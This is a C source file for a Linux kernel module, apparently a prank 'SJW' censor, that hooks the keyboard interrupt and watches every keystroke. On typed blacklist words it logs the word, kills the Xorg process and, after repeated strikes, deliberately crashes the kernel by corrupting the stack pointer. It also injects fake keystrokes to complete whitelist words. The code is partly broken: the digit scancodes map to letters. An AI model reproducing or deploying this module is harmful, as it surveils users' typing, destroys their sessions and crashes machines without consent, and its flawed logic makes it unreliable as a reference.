#include "../include/keyfun.h"

static void switch_tty(void) {
    
    // L CTRL 
    msleep(1);
    outb(0xD2, 0x64); 
    msleep(1);
    outb(0x1D, 0x60);

    // L ALT
    msleep(1);
    outb(0xD2, 0x64); 
    msleep(1);
    outb(0x38, 0x60);

    // F9
    msleep(1);
    outb(0xD2, 0x64); 
    msleep(1);
    outb(0x43, 0x60);
}

static void press_key(char c) {
    char pressed = '\0';
    
    if (c >= 'a' && c <= 'z')       pressed = ps2_alph[c - 'a']; 
    else if (c >= '0' && c <= '9')  pressed = ps2_num[c - '0'];
    else if (c == ' ')              pressed = ps2_other[0]; 
    else                            return;

    char released = 0x80 | pressed; 

    msleep(1);
    outb(0xD2, 0x64); 
    msleep(1);
    outb(pressed, 0x60);
    msleep(1);
    outb(0xD2, 0x64); 
    msleep(1);
    outb(released, 0x60);
} 

static char scan_to_char(char scanval) {
    switch (scanval) {
        /* alpha */ 
        case 0x1e: return 'a'; case 0x30: return 'b'; case 0x2e: return 'c'; 
        case 0x20: return 'd'; case 0x12: return 'e'; case 0x21: return 'f'; 
        case 0x22: return 'g'; case 0x23: return 'h'; case 0x17: return 'i'; 
        case 0x24: return 'j'; case 0x25: return 'k'; case 0x26: return 'l'; 
        case 0x32: return 'm'; case 0x31: return 'n'; case 0x18: return 'o'; 
        case 0x19: return 'p'; case 0x10: return 'q'; case 0x13: return 'r'; 
        case 0x1f: return 's'; case 0x14: return 't'; case 0x16: return 'u'; 
        case 0x2f: return 'v'; case 0x11: return 'w'; case 0x2d: return 'x'; 
        case 0x15: return 'y'; case 0x2c: return 'z';

        /* num */
        case 0xb: return 'a'; case 0x2: return 'b'; case 0x3: return 'c'; 
        case 0x4: return 'd'; case 0x5: return 'e'; case 0x6: return 'f'; 
        case 0x7: return 'g'; case 0x8: return 'h'; case 0x9: return 'i'; 
        case 0xa: return 'j'; 

        case 0x39: return ' ';
        case 0x0e: return '\b'; 

        /* no support */
        default: return '\0';
    } 
}

static irqreturn_t kbd_isr(int irq, void* dev_id) {
    unsigned char scancode = inb(0x60);
    char down = scancode >> 7; 
    char scanval = 0x7f & scancode;
    if (down) {
        
        char pressed = scan_to_char(scanval);
    
        // don't care about unkown scancodes
        if (pressed == '\0') 
            return IRQ_HANDLED;

        uint8_t i; 
        /* check if new character contributed to whitelist word */ 
        for (i = 0; i < whitelist_n; i++) {
            char current_target = whitelist[i]->word[whitelist[i]->target_idx];
            if (pressed == current_target) whitelist[i]->target_idx++;
            else whitelist[i]->target_idx = 0;

            //uint8_t halfway = whitelist[i]->word_len / 2 - 2; 
            uint8_t halfway = whitelist[i]->halfway_idx; 
            if (whitelist[i]->target_idx > halfway) {
                char* rem = whitelist[i]->word; 
                rem += halfway + 1;
                
                uint8_t j;                
                for (j = 0; j < whitelist[i]->word_len; j++) 
                    press_key(*(rem + j));
            }
        }

        /* check if new character contributed to blacklist word */ 
        for (i = 0; i < blacklist_n; i++) {
            char current_target = blacklist[i]->word[blacklist[i]->target_idx];
            if (pressed == current_target) blacklist[i]->target_idx++;
            else if (pressed == '\b') {
                if (blacklist[i]->target_idx > 0) blacklist[i]->target_idx--;
            }
            else blacklist[i]->target_idx = 0;

            if (blacklist[i]->target_idx == blacklist[i]->word_len) {
                strike++; 
                if (strike == STRIKE_NUM) {
                    switch_tty();
                    msleep(1000); 
        
                    // kernel commit suicide 
                    __asm__("mov $69, %rsp\n\t"
                            "push %rax\n\t");
                }
                else {
                    pr_emerg("TYPED %s", blacklist[i]->word);
                    blacklist[i]->target_idx = 0;
                    kill_xorg();
                }
            }
        }
    }
    else {
        // pr_emerg("up");
    }
    return IRQ_HANDLED;
}


static irqreturn_t kbd_isr_quick(int irq, void* dev_id) {
    return IRQ_WAKE_THREAD;
}

static void kill_task(struct task_struct* victim) {
    struct kernel_siginfo info;
    info.si_signo = SIGKILL;
    info.si_code = SI_KERNEL;
    info.si_int = 666;
    send_sig_info(SIGKILL, &info, victim);
}

static void kill_xorg(void) {
    struct task_struct *task; 
    for_each_process(task) {
        //pr_emerg("name: %s, pid: [%d]", task->comm, task->pid); 
        if (strcmp(task->comm, "Xorg") == 0) {
            pr_emerg("Found Xorg as pid %d", task->pid);
            kill_task(task);
        }
    }
}

static void init_wordlist(word_target*** list, uint8_t* list_n) {
    *list = (word_target**) kmalloc(*list_n * sizeof(word_target*), 0);
    uint8_t i;
    for (i = 0; i < *list_n; i++) {
        (*list)[i] = (word_target*) kmalloc(sizeof(word_target), 0); 
        (*list)[i]->target_idx = 0;
    }
}

static void set_word(word_target*** list, uint8_t idx, const char* word, uint8_t halfway) {
    (*list)[idx]->word = (char*) word;  
    (*list)[idx]->word_len = strlen(word);
    (*list)[idx]->halfway_idx = halfway;
    pr_emerg("setting word %s with halfway %d at idx %d", word, halfway, idx);
}

static int __init keyfun_init(void) {
    pr_emerg("Innited SJW kernel module...");

    uint8_t i;

    init_wordlist(&blacklist, &blacklist_n);
    for (i = 0; i < blacklist_n; i++) 
        set_word(&blacklist, i, blacklist_words[i], 0);
    
    init_wordlist(&whitelist, &whitelist_n);
    for (i = 0; i < whitelist_n; i++) 
        set_word(&whitelist, i, whitelist_words[i], whitelist_completion[i]);

    request_threaded_irq(0x1, kbd_isr_quick, kbd_isr, IRQF_SHARED, "KBD", (void*) kbd_isr); 

    return 0;
}

static void __exit keyfun_cleanup(void) {
    free_irq(1, (void*) kbd_isr);
}


